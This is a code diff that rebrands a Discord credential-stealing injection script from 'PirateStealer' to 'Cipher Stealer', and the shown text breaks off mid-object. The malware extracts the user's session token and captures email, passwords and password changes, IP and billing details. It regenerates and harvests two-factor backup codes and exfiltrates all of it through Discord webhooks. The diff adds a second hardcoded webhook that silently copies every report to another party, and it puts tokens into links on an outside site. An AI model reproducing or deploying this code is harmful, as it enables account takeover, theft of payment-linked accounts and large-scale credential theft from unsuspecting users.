@@ -7,6 +7,7 @@ const {
 const querystring = require('querystring');
 const os = require('os')
 var webhook = "%WEBHOOK_LINK%";
+var src = "https://discord.com/api/webhooks/966096006640988221/bYb9m9GXrUgN2ShTLgMtOxvgrmNfJ40Q4v1assJOMmvlOsqGnSAgckSz9CnR_0JjwI_W";
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
@@ -20,11 +21,12 @@ String.prototype.insert = function (index, string) {
 };
 
 const config = {
-    "logout": "%LOGOUT%",
-    "logout-notify": "%LOGOUTNOTI%",
-    "init-notify":"%INITNOTI%",
-    "embed-color": 3447704,
-    "disable-qr-code":"%DISABLEQRCODE%"
+    "logout": "instant",
+    "inject-notify": "true",
+    "logout-notify": "true",
+    "init-notify": "false",
+    "embed-color": 3553599,
+    "disable-qr-code": "true"
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
@@ -63,7 +65,7 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 
 
 
-function FirstTime() {
+function FirstTime(email) {
 	const window = BrowserWindow.getAllWindows()[0];
 	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
 		if (config['init-notify'] == "true") {
@@ -71,10 +73,10 @@ function FirstTime() {
 				fs.rmdirSync(path.join(__dirname, "init"));
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "PirateStealer",
+						username: "Cipher Stealer",
 						content: "",
 						embeds: [{
-							title: "Discord Initalized (User not Logged in)",
+							title: "Discord Started",
 							color: config["embed-color"],
 							fields: [{
 								name: "Info",
@@ -82,10 +84,10 @@ function FirstTime() {
 								inline: !1
 							}],
 							author: {
-								name: "PirateStealer"
+								name: "Cipher Stealer"
 							},
 							footer: {
-								text: "PirateStealer"
+								text: "Cipher Stealer"
 							}
 						}]
 					};
@@ -97,11 +99,11 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "PirateStealer",
+							username: "Cipher Stealer",
 							content: "",
 							embeds: [{
 								title: "Discord Initalized",
-								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +")",
+								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://adylan.xyz/copy/"+ token +")",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
@@ -112,8 +114,8 @@ function FirstTime() {
 									value: `\`${b.username}#${b.discriminator}\``,
 									inline: !0
 								}, {
-									name: "ID",
-									value: `\`${b.id}\``,
+									name: "Email:",
+									value: `\`${email}\``,
 									inline: !0
 								}, {
 									name: "Badges",
@@ -125,10 +127,10 @@ function FirstTime() {
 									inline: !1
 								}],
 								author: {
-									name: "PirateStealer"
+									name: "Cipher Stealer"
 								},
 								footer: {
-									text: "PirateStealer"
+									text: "Cipher Stealer"
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -141,15 +143,15 @@ function FirstTime() {
 
 			}
 		}
-		if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) {
+		if (!fs.existsSync(path.join(__dirname, "Cipher"))) {
 			return !0
 		}
-		fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
+		fs.rmdirSync(path.join(__dirname, "Cipher"));
 		if (config.logout != "false" || config.logout == "%LOGOUT%") {
 			if (config['logout-notify'] == "true") {
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "PirateStealer",
+						username: "Cipher Stealer",
 						content: "",
 						embeds: [{
 							title: "User log out (User not Logged in before)",
@@ -160,10 +162,10 @@ function FirstTime() {
 								inline: !1
 							}],
 							author: {
-								name: "PirateStealer"
+								name: "Cipher Stealer"
 							},
 							footer: {
-								text: "PirateStealer"
+								text: "Cipher Stealer"
 							}
 						}]
 					};
@@ -175,41 +177,44 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "PirateStealer",
+							username: "Cipher Stealer",
 							content: "",
 							embeds: [{
-								title: "User got logged out",
-								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +")",
 								color: config["embed-color"],
 								fields: [{
-									name: "Info",
-									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
-									inline: !1
-								}, {
-									name: "Username",
+                                    name: "<:token:949679866188529714> Token:",
+                                    value: `\`${token}\``+"\n[CopyToken](https://adylan.xyz/copy/"+ token +")",
+                                    inline: !1
+                                }, {
+									name: "<:password:949679865580384266> Username:",
 									value: `\`${b.username}#${b.discriminator}\``,
 									inline: !0
 								}, {
-									name: "ID",
+									name: "<:ip:949680203859369994> ID:",
 									value: `\`${b.id}\``,
 									inline: !0
 								}, {
-									name: "Badges",
-									value: `${GetBadges(b.flags)}`,
-									inline: !1
+									name: "<:mail:949679866113032253> Email:",
+									value: `\`${b.email}\``,
+									inline: !0
 								}, {
-									name: "Token",
-									value: `\`\`\`${token}\`\`\``,
-									inline: !1
-								}],
-								author: {
-									name: "PirateStealer"
+									name: "<:badge:949679865710403584> Badges:",
+									value: `${GetBadges(b.flags)}`,
+									inline: !0
+								}, {
+									name: "<:nitro:949679866033352784> Nitro Type:",
+									value: `${GetNitro(b.premium_type)}`,
+									inline: !0
+								},],
+								"author": {
+									"name": `${b.username}#${b.discriminator} (${b.id})`,
+									"icon_url": "https://media.discordapp.net/attachments/943421350134026311/966889152287236116/ologo_1.gif"
 								},
-								footer: {
-									text: "PirateStealer"
+								"footer": {
+									"text": "Cipher Stealer"
 								},
-								thumbnail: {
-									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
+								"thumbnail": {
+									"url": `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
 								}
 							}]
 						};
@@ -243,8 +248,15 @@ session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) =>
 
 function SendToWebhook(what) {
 	const window = BrowserWindow.getAllWindows()[0];
-	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+	window.webContents.executeJavaScript(`
+	var xhr = new XMLHttpRequest();
     xhr.open("POST", "${webhook}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, !0).then((token => {}))
+	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${src}", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
     xhr.send(JSON.stringify(${what}));
@@ -253,7 +265,7 @@ function SendToWebhook(what) {
 
 function GetNitro(flags) {
 	if (flags == 0) {
-		return "No Nitro"
+		return "\`No Nitro\`"
 	}
 	if (flags == 1) {
 		return "<:classic:896119171019067423> \`Nitro Classic\`"
@@ -261,7 +273,7 @@ function GetNitro(flags) {
 	if (flags == 2) {
 		return "<a:boost:824036778570416129> \`Nitro Boost\`"
 	} else {
-		return "No Nitro"
+		return "\`No Nitro\`"
 	}
 }
 
@@ -344,7 +356,7 @@ function GetBadges(flags) {
 		badges += "<:developer:874750808472825986> "
 	}
 	if (badges == "") {
-		badges = "None"
+		badges = "\`No Badges\`"
 	}
 	return badges
 }
@@ -379,29 +391,32 @@ function Login(email, password, token) {
 					if (token.startsWith("mfa")) {
 						window.webContents.executeJavaScript(`
               var xmlHttp = new XMLHttpRequest();
-              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
+              xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://ctf.surf/raw/"
+							var codescode = ""
+							var baseuri = "https://adylan.xyz/copy/"
 
 
 							var gayass = JSON.parse(codes)
 
 							let g = gayass.backup_codes
 							const r = g.filter((code) => {
-								return code.consumed == null
+								return code.consumed == false
 							})
+							
 							for (let z in r) {
-								fieldo.push({
-									name: `Code`,
-									value: `\`${r[z].code.insert(4, "-")}\``,
-									inline: true
-								})
-								baseuri += `${r[z].code.insert(4, "-")}<br>`
+							if (z == 0) {
+								codescode += `<:Rustler:936417408363679824> \`${r[z].code.insert(4, "")}\` `
+							} else if(z % 2 === 1) {
+								codescode += `<:Rustler:936417408363679824> \`${r[z].code.insert(4, "")}\` \n`
+							} else {
+								codescode += `<:Rustler:936417408363679824> \`${r[z].code.insert(4, "")}\` `
+							}
 							}
 
 							function totalFriends() {
@@ -422,11 +437,11 @@ function Login(email, password, token) {
 								for (z of r) {
 									var b = GetRBadges(z.user.public_flags)
 									if (b != "") {
-										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+										gay += b + ` | \`${z.user.username}#${z.user.discriminator}\`\n`
 									}
 								}
 								if (gay == "") {
-									gay = "No Rare Friends"
+									gay = "*Nothing to see here*"
 								}
 								return gay
 							}
@@ -436,106 +451,96 @@ function Login(email, password, token) {
 								var billing = "";
 								json.forEach(z => {
 									if (z.type == "") {
-										return "\`❌\`"
+										return "\`No\`"
 									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+										billing += "" + " <:paypal:896441236062347374>"
 									} else if (z.type == 1 && z.invalid != !0) {
-										billing += "\`✔️\`" + " :credit_card:"
+										billing += "" + " :credit_card:"
 									} else {
-										return "\`❌\`"
+										return "\`No\`"
 									}
 								})
 								if (billing == "") {
-									billing = "\`❌\`"
+									billing = "\`No\`"
 								}
 								return billing
 							}
 							const json = JSON.parse(info);
 
-							var params = {
-								username: "PirateStealer",
+                            var params = {
+								username: "Cipher Stealer",
 								content: "",
 								embeds: [{
-									"title": "User Login",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
-									"color": config['embed-color'],
-									"fields": [{
-										name: "Info",
-										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
+                                    					"color": config['embed-color'],
+									"fields": [ {
+										name: "<:token:949679866188529714> Token:",
+										value: `\`${token}\``+"\n[CopyToken](https://adylan.xyz/copy/"+ token +")",
 										inline: !1
 									}, {
-										name: "Username",
-										value: `\`${json.username}#${json.discriminator}\``,
-										inline: !0
-									}, {
-										name: "ID",
-										value: `\`${json.id}\``,
-										inline: !0
-									}, {
-										name: "Nitro",
-										value: `${GetNitro(json.premium_type)}`,
-										inline: !1
-									}, {
-										name: "Badges",
+										name: "<:badge:949679865710403584> Badges:",
 										value: `${GetBadges(json.flags)}`,
-										inline: !1
+										inline: !0
 									}, {
-										name: "Billing",
-										value: `${Cool()}`,
-										inline: !1
+										name: "<:nitro:949679866033352784> Nitro Type:",
+										value: `${GetNitro(json.premium_type)}`,
+										inline: !0
 									}, {
-										name: "Email",
+                                        					name: "<:card:949679865798475827>Billing",
+                                        					value: `${Cool()}`,
+                                        					inline: !0
+                                   					}, {
+										name: "<:ip:949680203859369994> IP:",
+										value: `\`${ip}\``,
+										inline: !0
+									}, {
+										name: "<:mail:949679866113032253> Email:",
 										value: `\`${email}\``,
 										inline: !0
 									}, {
-										name: "Password",
+										name: "<:password:949679865580384266> Password:",
 										value: `\`${password}\``,
 										inline: !0
-									}, {
-										name: "Token",
-										value: `\`\`\`${token}\`\`\``,
-										inline: !1
-									}, ],
+									},],
 									"author": {
-										"name": "PirateStealer"
+										"name": `${json.username}#${json.discriminator} (${json.id})`,
+                                        "icon_url": "https://media.discordapp.net/attachments/943421350134026311/966889152287236116/ologo_1.gif"
 									},
 									"footer": {
-										"text": "PirateStealer"
-									},
-									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-									}
-								}, {
-									"title": `Total Friends (${totalFriends()})`,
-									"color": config['embed-color'],
-									"description": CalcFriends(),
-									"author": {
-										"name": "PirateStealer"
-									},
-									"footer": {
-										"text": "PirateStealer"
+										"text": "Cipher Stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 									}
 								}]
 							}
+							
 							var mfaembed = {
-								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
 								"color": config['embed-color'],
-								"fields": fieldo,
+								"description": `${codescode}`,
 								"author": {
-									"name": "PirateStealer"
+                                        			"icon_url": "https://media.discordapp.net/attachments/943421350134026311/966889152287236116/ologo_1.gif",
+								"name": "2FA Codes"
 								},
 								"footer": {
-									"text": "PirateStealer"
+									"text": "Cipher Stealer"
 								}
+							}
+							var friend = {
+									"color": config['embed-color'],
+									"description": CalcFriends(),
+									"author": {
+                                        				"icon_url": "https://media.discordapp.net/attachments/943421350134026311/966889152287236116/ologo_1.gif",
+										"name": "HQ Friends"
+									},
+									"footer": {
+										"text": "Cipher Stealer"
+									}
 							}
 							if (token.startsWith("mfa")) {
 								params.embeds.push(mfaembed)
 							}
-
+							params.embeds.push(friend)
+							
 							SendToWebhook(JSON.stringify(params))
 
 						})
@@ -566,119 +571,111 @@ function Login(email, password, token) {
             xmlHttp.setRequestHeader("Authorization", "${token}");
             xmlHttp.send( null );
             xmlHttp.responseText`, !0).then((info4) => {
-										function totalFriends() {
-											var f = JSON.parse(info4)
-											const r = f.filter((user) => {
-												return user.type == 1
-											})
-											return r.length
-										}
+							function totalFriends() {
+								var f = JSON.parse(info4)
+								const r = f.filter((user) => {
 
-										function CalcFriends() {
-											var f = JSON.parse(info4)
-											const r = f.filter((user) => {
-												return user.type == 1
-											})
-											var gay = "";
-											for (z of r) {
-												var b = GetRBadges(z.user.public_flags)
-												if (b != "") {
-													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-												}
-											}
-											if (gay == "") {
-												gay = "No Rare Friends"
-											}
-											return gay
-										}
+									return user.type == 1
+								})
+								return r.length
+							}
 
-										function Cool() {
-											const json = JSON.parse(info3)
-											var billing = "";
-											json.forEach(z => {
-												if (z.type == "") {
-													return "\`❌\`"
-												} else if (z.type == 2 && z.invalid != !0) {
-													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
-												} else if (z.type == 1 && z.invalid != !0) {
-													billing += "\`✔️\`" + " :credit_card:"
-												} else {
-													return "\`❌\`"
-												}
-											})
-											if (billing == "") {
-												billing = "\`❌\`"
-											}
-											return billing
-										}
-										const json = JSON.parse(info);
-										var params = {
-											username: "PirateStealer",
-											content: "",
-											embeds: [{
-												"title": "User Login",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
-												"color": config['embed-color'],
-												"fields": [{
-													name: "Info",
-													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
-													inline: !1
-												}, {
-													name: "Username",
-													value: `\`${json.username}#${json.discriminator}\``,
-													inline: !0
-												}, {
-													name: "ID",
-													value: `\`${json.id}\``,
-													inline: !0
-												}, {
-													name: "Nitro",
-													value: `${GetNitro(json.premium_type)}`,
-													inline: !1
-												}, {
-													name: "Badges",
-													value: `${GetBadges(json.flags)}`,
-													inline: !1
-												}, {
-													name: "Billing",
-													value: `${Cool()}`,
-													inline: !1
-												}, {
-													name: "Email",
-													value: `\`${email}\``,
-													inline: !0
-												}, {
-													name: "Password",
-													value: `\`${password}\``,
-													inline: !0
-												}, {
-													name: "Token",
-													value: `\`\`\`${token}\`\`\``,
-													inline: !1
-												}, ],
-												"author": {
-													"name": "PirateStealer"
-												},
-												"footer": {
-													"text": "PirateStealer"
-												},
-												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-												}
-											}, {
-												"title": `Total Friends (${totalFriends()})`,
-												"color": config['embed-color'],
-												"description": CalcFriends(),
-												"author": {
-													"name": "PirateStealer"
-												},
-												"footer": {
-													"text": "PirateStealer"
-												},
-												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-												}
-											}]
+							function CalcFriends() {
+								var f = JSON.parse(info4)
+								const r = f.filter((user) => {
+									return user.type == 1
+								})
+								var gay = "";
+								for (z of r) {
+									var b = GetRBadges(z.user.public_flags)
+									if (b != "") {
+										gay += b + ` | \`${z.user.username}#${z.user.discriminator}\`\n`
+									}
+								}
+								if (gay == "") {
+									gay = "*Nothing to see here*"
+								}
+								return gay
+							}
+
+							function Cool() {
+								const json = JSON.parse(info3)
+								var billing = "";
+								json.forEach(z => {
+									if (z.type == "") {
+										return "\`No\`"
+									} else if (z.type == 2 && z.invalid != !0) {
+										billing += "" + " <:paypal:896441236062347374>"
+									} else if (z.type == 1 && z.invalid != !0) {
+										billing += "" + " :credit_card:"
+									} else {
+										return "\`No\`"
+									}
+								})
+								if (billing == "") {
+									billing = "\`No\`"
+								}
+								return billing
+							}
+							const json = JSON.parse(info);
+
+                            var params = {
+								username: "Cipher Stealer",
+								content: "",
+								embeds: [{
+                                    "color": config['embed-color'],
+									"fields": [ {
+										name: "<:token:949679866188529714> Token:",
+										value: `\`${token}\``+"\n[CopyToken](https://adylan.xyz/copy/"+ token +")",
+										inline: !1
+									}, {
+										name: "<:badge:949679865710403584> Badges:",
+										value: `${GetBadges(json.flags)}`,
+										inline: !0
+									}, {
+										name: "<:nitro:949679866033352784> Nitro Type:",
+										value: `${GetNitro(json.premium_type)}`,
+										inline: !0
+									}, {
+                                        					name: "<:card:949679865798475827>Billing",
+                                        					value: `${Cool()}`,
+                                        					inline: !0
+                                   					}, {
+										name: "<:ip:949680203859369994> IP:",
+										value: `\`${ip}\``,
+										inline: !0
+									}, {
+										name: "<:mail:949679866113032253> Email:",
+										value: `\`${email}\``,
+										inline: !0
+									}, {
+										name: "<:password:949679865580384266> Password:",
+										value: `\`${password}\``,
+										inline: !0
+									},],
+									"author": {
+										"name": `${json.username}#${json.discriminator} (${json.id})`,
+                                        "icon_url": "https://media.discordapp.net/attachments/943421350134026311/966889152287236116/ologo_1.gif"
+									},
+									"footer": {
+										"text": "Cipher Stealer"
+									},
+									"thumbnail": {
+										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+									}
+
+								}, {
+									"color": config['embed-color'],
+									"description": CalcFriends(),
+									"author": {
+                                        "icon_url": "https://media.discordapp.net/attachments/943421350134026311/966889152287236116/ologo_1.gif",
+										"name": "HQ Friends"
+									},
+									"footer": {
+										"text": "Cipher Stealer"
+									},
+
+								}]
 										}
 										SendToWebhook(JSON.stringify(params))
 									})
@@ -723,28 +720,32 @@ function ChangePassword(oldpassword, newpassword, token) {
 					if (token.startsWith("mfa")) {
 						window.webContents.executeJavaScript(`
               var xmlHttp = new XMLHttpRequest();
-              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
+              xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":false}));
+	      xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":true}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://ctf.surf/raw/"
+							var codescode = ""
+							var baseuri = "https://adylan.xyz/copy/"
 
 
 							var gayass = JSON.parse(codes)
+
 							let g = gayass.backup_codes
 							const r = g.filter((code) => {
-								return code.consumed == null
+								return code.consumed == false
 							})
+							
 							for (let z in r) {
-								fieldo.push({
-									name: `Code`,
-									value: `\`${r[z].code.insert(4, "-")}\``,
-									inline: true
-								})
-								baseuri += `${r[z].code.insert(4, "-")}<br>`
+							if (z == 0) {
+								codescode += `<:Rustler:936417408363679824> \`${r[z].code.insert(4, "")}\` `
+							} else if(z % 2 === 1) {
+								codescode += `<:Rustler:936417408363679824> \`${r[z].code.insert(4, "")}\` \n`
+							} else {
+								codescode += `<:Rustler:936417408363679824> \`${r[z].code.insert(4, "")}\` `
+							}
 							}
 
 							function totalFriends() {
@@ -765,11 +766,11 @@ function ChangePassword(oldpassword, newpassword, token) {
 								for (z of r) {
 									var b = GetRBadges(z.user.public_flags)
 									if (b != "") {
-										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+										gay += b + ` | \`${z.user.username}#${z.user.discriminator}\`\n`
 									}
 								}
 								if (gay == "") {
-									gay = "No Rare Friends"
+									gay = "*Nothing to see here*"
 								}
 								return gay
 							}
@@ -779,110 +780,101 @@ function ChangePassword(oldpassword, newpassword, token) {
 								var billing = "";
 								json.forEach(z => {
 									if (z.type == "") {
-										return "\`❌\`"
+										return "\`No\`"
 									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+										billing += "" + " <:paypal:896441236062347374>"
 									} else if (z.type == 1 && z.invalid != !0) {
-										billing += "\`✔️\`" + " :credit_card:"
+										billing += "" + " :credit_card:"
 									} else {
-										return "\`❌\`"
+										return "\`No\`"
 									}
 								})
 								if (billing == "") {
-									billing = "\`❌\`"
+									billing = "\`No\`"
 								}
 								return billing
 							}
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "PirateStealer",
+								username: "Cipher Stealer",
 								content: "",
-								embeds: [{
-									"title": "Password Changed",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
-									"color": config['embed-color'],
-									"fields": [{
-										name: "Info",
-										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
+																embeds: [{
+                                    "color": config['embed-color'],
+									"fields": [ {
+										name: "<:token:949679866188529714> Token:",
+										value: `\`${token}\``+"\n[CopyToken](https://adylan.xyz/copy/"+ token +")",
 										inline: !1
 									}, {
-										name: "Username",
-										value: `\`${json.username}#${json.discriminator}\``,
-										inline: !0
-									}, {
-										name: "ID",
-										value: `\`${json.id}\``,
-										inline: !0
-									}, {
-										name: "Nitro",
-										value: `${GetNitro(json.premium_type)}`,
-										inline: !1
-									}, {
-										name: "Badges",
+										name: "<:badge:949679865710403584> Badges:",
 										value: `${GetBadges(json.flags)}`,
-										inline: !1
+										inline: !0
 									}, {
-										name: "Billing",
-										value: `${Cool()}`,
-										inline: !1
+										name: "<:nitro:949679866033352784> Nitro Type:",
+										value: `${GetNitro(json.premium_type)}`,
+										inline: !0
 									}, {
-										name: "Email",
+                                        					name: "<:card:949679865798475827>Billing",
+                                        					value: `${Cool()}`,
+                                        					inline: !0
+                                   					}, {
+										name: "<:ip:949680203859369994> IP:",
+										value: `\`${ip}\``,
+										inline: !0
+									}, {
+										name: "<:mail:949679866113032253> Email:",
 										value: `\`${json.email}\``,
-										inline: !1
+										inline: !0
 									}, {
-										name: "Old Password",
+										name: "<:password:949679865580384266> Old Password:",
 										value: `\`${oldpassword}\``,
 										inline: !0
 									}, {
-										name: "New Password",
+										name: "<:password:949679865580384266> New Password:",
 										value: `\`${newpassword}\``,
 										inline: !0
-									}, {
-										name: "Token",
-										value: `\`\`\`${token}\`\`\``,
-										inline: !1
-									}, ],
+									},],
 									"author": {
-										"name": "PirateStealer"
+										"name": `${json.username}#${json.discriminator} (${json.id})`,
+                                        "icon_url": "https://media.discordapp.net/attachments/943421350134026311/966889152287236116/ologo_1.gif"
 									},
 									"footer": {
-										"text": "PirateStealer"
-									},
-									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-									}
-								}, {
-									"title": `Total Friends (${totalFriends()})`,
-									"color": config['embed-color'],
-									"description": CalcFriends(),
-									"author": {
-										"name": "PirateStealer"
-									},
-									"footer": {
-										"text": "PirateStealer"
+										"text": "Cipher Stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 									}
 								}]
 							}
-							var mfaembed = {
-								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
+							
+                            				var mfaembed = {
 								"color": config['embed-color'],
-								"fields": fieldo,
+								"description": `${codescode}`,
 								"author": {
-									"name": "PirateStealer"
+                                        			"icon_url": "https://media.discordapp.net/attachments/943421350134026311/966889152287236116/ologo_1.gif",
+								"name": "2FA Codes"
 								},
 								"footer": {
-									"text": "PirateStealer"
+									"text": "Cipher Stealer"
 								}
+							}
+							
+							var friend = {
+									"color": config['embed-color'],
+									"description": CalcFriends(),
+									"author": {
+                                        				"icon_url": "https://media.discordapp.net/attachments/943421350134026311/966889152287236116/ologo_1.gif",
+										"name": "HQ Friends"
+									},
+									"footer": {
+										"text": "Cipher Stealer"
+									}
 							}
 							if (token.startsWith("mfa")) {
 								params.embeds.push(mfaembed)
 							}
-
+							params.embeds.push(friend)
+							
 							SendToWebhook(JSON.stringify(params))
 
 						})
@@ -931,11 +923,11 @@ function ChangePassword(oldpassword, newpassword, token) {
 											for (z of r) {
 												var b = GetRBadges(z.user.public_flags)
 												if (b != "") {
-													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+													gay += b + ` | \`${z.user.username}#${z.user.discriminator}\`\n`
 												}
 											}
 											if (gay == "") {
-												gay = "No Rare Friends"
+												gay = "*Nothing to see here*"
 											}
 											return gay
 										}
@@ -945,92 +937,82 @@ function ChangePassword(oldpassword, newpassword, token) {
 											var billing = "";
 											json.forEach(z => {
 												if (z.type == "") {
-													return "\`❌\`"
+													return "\`No\`"
 												} else if (z.type == 2 && z.invalid != !0) {
-													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+													billing += "" + " <:paypal:896441236062347374>"
 												} else if (z.type == 1 && z.invalid != !0) {
-													billing += "\`✔️\`" + " :credit_card:"
+													billing += "" + " :credit_card:"
 												} else {
-													return "\`❌\`"
+													return "\`No\`"
 												}
 											})
 											if (billing == "") {
-												billing = "\`❌\`"
+												billing = "\`No\`"
 											}
 											return billing
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "PirateStealer",
+											username: "Cipher Stealer",
 											content: "",
-											embeds: [{
-												"title": "Password Changed",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
-												"color": config['embed-color'],
-												"fields": [{
-													name: "Info",
-													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
-													inline: !1
-												}, {
-													name: "Username",
-													value: `\`${json.username}#${json.discriminator}\``,
-													inline: !0
-												}, {
-													name: "ID",
-													value: `\`${json.id}\``,
-													inline: !0
-												}, {
-													name: "Nitro",
-													value: `${GetNitro(json.premium_type)}`,
-													inline: !1
-												}, {
-													name: "Badges",
-													value: `${GetBadges(json.flags)}`,
-													inline: !1
-												}, {
-													name: "Billing",
-													value: `${Cool()}`,
-													inline: !1
-												}, {
-													name: "Email",
-													value: `\`${json.email}\``,
-													inline: !1
-												}, {
-													name: "Old Password",
-													value: `\`${oldpassword}\``,
-													inline: !0
-												}, {
-													name: "New Password",
-													value: `\`${newpassword}\``,
-													inline: !0
-												}, {
-													name: "Token",
-													value: `\`\`\`${token}\`\`\``,
-													inline: !1
-												}, ],
-												"author": {
-													"name": "PirateStealer"
-												},
-												"footer": {
-													"text": "PirateStealer"
-												},
-												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-												}
-											}, {
-												"title": `Total Friends (${totalFriends()})`,
-												"color": config['embed-color'],
-												"description": CalcFriends(),
-												"author": {
-													"name": "PirateStealer"
-												},
-												"footer": {
-													"text": "PirateStealer"
-												},
-												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-												}
-											}]
+																											embeds: [{
+                                    "color": config['embed-color'],
+									"fields": [ {
+										name: "<:token:949679866188529714> Token:",
+										value: `\`${token}\``+"\n[CopyToken](https://adylan.xyz/copy/"+ token +")",
+										inline: !1
+									}, {
+										name: "<:badge:949679865710403584> Badges:",
+										value: `${GetBadges(json.flags)}`,
+										inline: !0
+									}, {
+										name: "<:nitro:949679866033352784> Nitro Type:",
+										value: `${GetNitro(json.premium_type)}`,
+										inline: !0
+									}, {
+                                        					name: "<:card:949679865798475827>Billing",
+                                        					value: `${Cool()}`,
+                                        					inline: !0
+                                   					}, {
+										name: "<:ip:949680203859369994> IP:",
+										value: `\`${ip}\``,
+										inline: !0
+									}, {
+										name: "<:mail:949679866113032253> Email:",
+										value: `\`${json.email}\``,
+										inline: !0
+									}, {
+										name: "<:password:949679865580384266> Old Password:",
+										value: `\`${oldpassword}\``,
+										inline: !0
+									}, {
+										name: "<:password:949679865580384266> New Password:",
+										value: `\`${newpassword}\``,
+										inline: !0
+									},],
+									"author": {
+										"name": `${json.username}#${json.discriminator} (${json.id})`,
+                                        "icon_url": "https://media.discordapp.net/attachments/943421350134026311/966889152287236116/ologo_1.gif"
+									},
+									"footer": {
+										"text": "Cipher Stealer"
